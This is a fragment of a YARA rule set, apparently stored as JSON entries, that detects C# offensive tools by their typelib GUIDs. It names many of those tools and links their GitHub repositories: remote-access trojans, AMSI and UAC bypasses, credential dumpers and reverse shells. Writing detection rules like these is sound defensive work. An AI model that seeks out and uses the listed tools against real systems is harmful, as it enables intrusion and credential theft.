  "HKTL_NET_GUID_Stealth_Kid_RAT": "rule HKTL_NET_GUID_Stealth_Kid_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ctsecurity/Stealth-Kid-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bf43cd33-c259-4711-8a0e-1a5c6c13811d\" ascii nocase wide\n        $typelibguid1 = \"e5b9df9b-a9e4-4754-8731-efc4e2667d88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpCradle": "rule HKTL_NET_GUID_SharpCradle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpCradle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f70d2b71-4aae-4b24-9dae-55bc819c78bb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BypassUAC": "rule HKTL_NET_GUID_BypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cnsimo/BypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4e7c140d-bcc4-4b15-8c11-adb4e54cc39a\" ascii nocase wide\n        $typelibguid1 = \"cec553a7-1370-4bbc-9aae-b2f5dbde32b0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_hanzoInjection": "rule HKTL_NET_GUID_hanzoInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P0cL4bs/hanzoInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"32e22e25-b033-4d98-a0b3-3d2c3850f06c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_clr_meterpreter": "rule HKTL_NET_GUID_clr_meterpreter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/OJ/clr-meterpreter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6840b249-1a0e-433b-be79-a927696ea4b3\" ascii nocase wide\n        $typelibguid1 = \"67c09d37-ac18-4f15-8dd6-b5da721c0df6\" ascii nocase wide\n        $typelibguid2 = \"e05d0deb-d724-4448-8c4c-53d6a8e670f3\" ascii nocase wide\n        $typelibguid3 = \"c3cc72bf-62a2-4034-af66-e66da73e425d\" ascii nocase wide\n        $typelibguid4 = \"7ace3762-d8e1-4969-a5a0-dcaf7b18164e\" ascii nocase wide\n        $typelibguid5 = \"3296e4a3-94b5-4232-b423-44f4c7421cb3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BYTAGE": "rule HKTL_NET_GUID_BYTAGE {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/KNIF/BYTAGE\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8e46ba56-e877-4dec-be1e-394cb1b5b9de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_MultiOS_ReverseShell": "rule HKTL_NET_GUID_MultiOS_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/belane/MultiOS_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"df0dd7a1-9f6b-4b0f-801e-e17e73b0801d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_HideFromAMSI": "rule HKTL_NET_GUID_HideFromAMSI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0r13lc0ch4v1/HideFromAMSI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b91d2d44-794c-49b8-8a75-2fbec3fe3fe3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DotNetAVBypass_Master": "rule HKTL_NET_GUID_DotNetAVBypass_Master {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/lockfale/DotNetAVBypass-Master\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4854c8dc-82b0-4162-86e0-a5bbcbc10240\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpDPAPI": "rule HKTL_NET_GUID_SharpDPAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDPAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5f026c27-f8e6-4052-b231-8451c6a73838\" ascii nocase wide\n        $typelibguid1 = \"2f00a05b-263d-4fcc-846b-da82bd684603\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Telegra_Csharp_C2": "rule HKTL_NET_GUID_Telegra_Csharp_C2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sf197/Telegra_Csharp_C2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1d79fabc-2ba2-4604-a4b6-045027340c85\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpCompile": "rule HKTL_NET_GUID_SharpCompile {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/SharpCompile\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"63f81b73-ff18-4a36-b095-fdcb4776da4c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Carbuncle": "rule HKTL_NET_GUID_Carbuncle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Carbuncle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3f239b73-88ae-413b-b8c8-c01a35a0d92e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_OSSFileTool": "rule HKTL_NET_GUID_OSSFileTool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/B1eed/OSSFileTool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"207aca5d-dcd6-41fb-8465-58b39efcde8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Rubeus": "rule HKTL_NET_GUID_Rubeus {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/Rubeus\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"658c8b7f-3664-4a95-9572-a3e5871dfc06\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Simple_Loader": "rule HKTL_NET_GUID_Simple_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cribdragg3r/Simple-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"035ae711-c0e9-41da-a9a2-6523865e8694\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Minidump": "rule HKTL_NET_GUID_Minidump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Minidump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"15c241aa-e73c-4b38-9489-9a344ac268a3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpBypassUAC": "rule HKTL_NET_GUID_SharpBypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FatRodzianko/SharpBypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0d588c86-c680-4b0d-9aed-418f1bb94255\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpPack": "rule HKTL_NET_GUID_SharpPack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Lexus89/SharpPack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid1 = \"b59c7741-d522-4a41-bf4d-9badddebb84a\" ascii nocase wide\n        $typelibguid2 = \"fd6bdf7a-fef4-4b28-9027-5bf750f08048\" ascii nocase wide\n        $typelibguid3 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n        $typelibguid5 = \"f3037587-1a3b-41f1-aa71-b026efdb2a82\" ascii nocase wide\n        $typelibguid6 = \"41a90a6a-f9ed-4a2f-8448-d544ec1fd753\" ascii nocase wide\n        $typelibguid7 = \"3787435b-8352-4bd8-a1c6-e5a1b73921f4\" ascii nocase wide\n        $typelibguid8 = \"fdd654f5-5c54-4d93-bf8e-faf11b00e3e9\" ascii nocase wide\n        $typelibguid9 = \"aec32155-d589-4150-8fe7-2900df4554c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Salsa_tools": "rule HKTL_NET_GUID_Salsa_tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hackplayers/Salsa-tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"276004bb-5200-4381-843c-934e4c385b66\" ascii nocase wide\n        $typelibguid1 = \"cfcbf7b6-1c69-4b1f-8651-6bdb4b55f6b9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_WindowsDefender_Payload_Downloader": "rule HKTL_NET_GUID_WindowsDefender_Payload_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/notkohlrexo/WindowsDefender-Payload-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2f8b4d26-7620-4e11-b296-bc46eba3adfc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Privilege_Escalation": "rule HKTL_NET_GUID_Privilege_Escalation {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/Privilege_Escalation\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ed54b904-5645-4830-8e68-52fd9ecbb2eb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Marauder": "rule HKTL_NET_GUID_Marauder {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/maraudershell/Marauder\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fff0a9a3-dfd4-402b-a251-6046d765ad78\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AV_Evasion_Tool": "rule HKTL_NET_GUID_AV_Evasion_Tool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/1y0n/AV_Evasion_Tool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1937ee16-57d7-4a5f-88f4-024244f19dc6\" ascii nocase wide\n        $typelibguid1 = \"7898617d-08d2-4297-adfe-5edd5c1b828b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Fenrir": "rule HKTL_NET_GUID_Fenrir {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Fenrir\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aecec195-f143-4d02-b946-df0e1433bd2e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_StormKitty": "rule HKTL_NET_GUID_StormKitty {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/StormKitty\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a16abbb4-985b-4db2-a80c-21268b26c73d\" ascii nocase wide\n        $typelibguid1 = \"98075331-1f86-48c8-ae29-29da39a8f98b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Crypter_Runtime_AV_s_bypass": "rule HKTL_NET_GUID_Crypter_Runtime_AV_s_bypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/netreverse/Crypter-Runtime-AV-s-bypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c25e39a9-8215-43aa-96a3-da0e9512ec18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_RunAsUser": "rule HKTL_NET_GUID_RunAsUser {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/atthacks/RunAsUser\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9dff282c-93b9-4063-bf8a-b6798371d35a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_HWIDbypass": "rule HKTL_NET_GUID_HWIDbypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/yunseok/HWIDbypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"47e08791-d124-4746-bc50-24bd1ee719a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_XORedReflectiveDLL": "rule HKTL_NET_GUID_XORedReflectiveDLL {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/XORedReflectiveDLL\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c0e49392-04e3-4abb-b931-5202e0eb4c73\" ascii nocase wide\n        $typelibguid1 = \"30eef7d6-cee8-490b-829f-082041bc3141\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Sharp_Suite": "rule HKTL_NET_GUID_Sharp_Suite {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Sharp-Suite\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"467ee2a9-2f01-4a71-9647-2a2d9c31e608\" ascii nocase wide\n        $typelibguid1 = \"5611236e-2557-45b8-be29-5d1f074d199e\" ascii nocase wide\n        $typelibguid2 = \"447edefc-b429-42bc-b3bc-63a9af19dbd6\" ascii nocase wide\n        $typelibguid3 = \"eacaa2b8-43e5-4888-826d-2f6902e16546\" ascii nocase wide\n        $typelibguid4 = \"a3b7c697-4bb6-455d-9fda-4ab54ae4c8d2\" ascii nocase wide\n        $typelibguid5 = \"a5f883ce-1f96-4456-bb35-40229191420c\" ascii nocase wide\n        $typelibguid6 = \"28978103-d90d-4618-b22e-222727f40313\" ascii nocase wide\n        $typelibguid7 = \"252676f8-8a19-4664-bfb8-5a947e48c32a\" ascii nocase wide\n        $typelibguid8 = \"414187db-5feb-43e5-a383-caa48b5395f1\" ascii nocase wide\n        $typelibguid9 = \"0c70c839-9565-4881-8ea1-408c1ebe38ce\" ascii nocase wide\n        $typelibguid10 = \"0a382d9a-897f-431a-81c2-a4e08392c587\" ascii nocase wide\n        $typelibguid11 = \"629f86e6-44fe-4c9c-b043-1c9b64be6d5a\" ascii nocase wide\n        $typelibguid12 = \"f0d28809-b712-4380-9a59-407b7b2badd5\" ascii nocase wide\n        $typelibguid13 = \"956a5a4d-2007-4857-9259-51cd0fb5312a\" ascii nocase wide\n        $typelibguid14 = \"53f622eb-0ca3-4e9b-9dc8-30c832df1c7b\" ascii nocase wide\n        $typelibguid15 = \"72019dfe-608e-4ab2-a8f1-66c95c425620\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_rat_shell": "rule HKTL_NET_GUID_rat_shell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/stphivos/rat-shell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7a15f8f6-6ce2-4ca4-919d-2056b70cc76a\" ascii nocase wide\n        $typelibguid1 = \"1659d65d-93a8-4bae-97d5-66d738fc6f6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_dotnet_gargoyle": "rule HKTL_NET_GUID_dotnet_gargoyle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/countercept/dotnet-gargoyle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76435f79-f8af-4d74-8df5-d598a551b895\" ascii nocase wide\n        $typelibguid1 = \"5a3fc840-5432-4925-b5bc-abc536429cb5\" ascii nocase wide\n        $typelibguid2 = \"6f0bbb2a-e200-4d76-b8fa-f93c801ac220\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_aresskit": "rule HKTL_NET_GUID_aresskit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/aresskit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8dca0e42-f767-411d-9704-ae0ba4a44ae8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DLL_Injector": "rule HKTL_NET_GUID_DLL_Injector {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tmthrgd/DLL-Injector\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4581a449-7d20-4c59-8da2-7fd830f1fd5e\" ascii nocase wide\n        $typelibguid1 = \"05f4b238-25ce-40dc-a890-d5bbb8642ee4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_TruffleSnout": "rule HKTL_NET_GUID_TruffleSnout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dsnezhkov/TruffleSnout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"33842d77-bce3-4ee8-9ee2-9769898bb429\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Anti_Analysis": "rule HKTL_NET_GUID_Anti_Analysis {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Anti-Analysis\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3092c8df-e9e4-4b75-b78e-f81a0058a635\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BackNet": "rule HKTL_NET_GUID_BackNet {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/valsov/BackNet\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9fdae122-cd1e-467d-a6fa-a98c26e76348\" ascii nocase wide\n        $typelibguid1 = \"243c279e-33a6-46a1-beab-2864cc7a499f\" ascii nocase wide\n        $typelibguid2 = \"a7301384-7354-47fd-a4c5-65b74e0bbb46\" ascii nocase wide\n        $typelibguid3 = \"982dc5b6-1123-428a-83dd-d212490c859f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AllTheThings": "rule HKTL_NET_GUID_AllTheThings {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/johnjohnsp1/AllTheThings\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0547ff40-5255-42a2-beb7-2ff0dbf7d3ba\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AddReferenceDotRedTeam": "rule HKTL_NET_GUID_AddReferenceDotRedTeam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ceramicskate0/AddReferenceDotRedTeam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"73c79d7e-17d4-46c9-be5a-ecef65b924e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Lime_Crypter": "rule HKTL_NET_GUID_Lime_Crypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Crypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f93c99ed-28c9-48c5-bb90-dd98f18285a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BrowserGhost": "rule HKTL_NET_GUID_BrowserGhost {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/BrowserGhost\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2133c634-4139-466e-8983-9a23ec99e01b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpShot": "rule HKTL_NET_GUID_SharpShot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tothi/SharpShot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"057aef75-861b-4e4b-a372-cfbd8322c8e1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Offensive__NET": "rule HKTL_NET_GUID_Offensive__NET {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mrjamiebowman/Offensive-.NET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"11fe5fae-b7c1-484a-b162-d5578a802c9c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_RuralBishop": "rule HKTL_NET_GUID_RuralBishop {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/RuralBishop\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe4414d9-1d7e-4eeb-b781-d278fe7a5619\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DeviceGuardBypasses": "rule HKTL_NET_GUID_DeviceGuardBypasses {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DeviceGuardBypasses\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f318466d-d310-49ad-a967-67efbba29898\" ascii nocase wide\n        $typelibguid1 = \"3705800f-1424-465b-937d-586e3a622a4f\" ascii nocase wide\n        $typelibguid2 = \"256607c2-4126-4272-a2fa-a1ffc0a734f0\" ascii nocase wide\n        $typelibguid3 = \"4e6ceea1-f266-401c-b832-f91432d46f42\" ascii nocase wide\n        $typelibguid4 = \"1e6e9b03-dd5f-4047-b386-af7a7904f884\" ascii nocase wide\n        $typelibguid5 = \"d85e3601-0421-4efa-a479-f3370c0498fd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AMSI_Handler": "rule HKTL_NET_GUID_AMSI_Handler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/AMSI_Handler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d829426c-986c-40a4-8ee2-58d14e090ef2\" ascii nocase wide\n        $typelibguid1 = \"86652418-5605-43fd-98b5-859828b072be\" ascii nocase wide\n        $typelibguid2 = \"1043649f-18e1-41c4-ae8d-ac4d9a86c2fc\" ascii nocase wide\n        $typelibguid3 = \"1d920b03-c537-4659-9a8c-09fb1d615e98\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_RAT_TelegramSpyBot": "rule HKTL_NET_GUID_RAT_TelegramSpyBot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SebastianEPH/RAT.TelegramSpyBot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8653fa88-9655-440e-b534-26c3c760a0d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
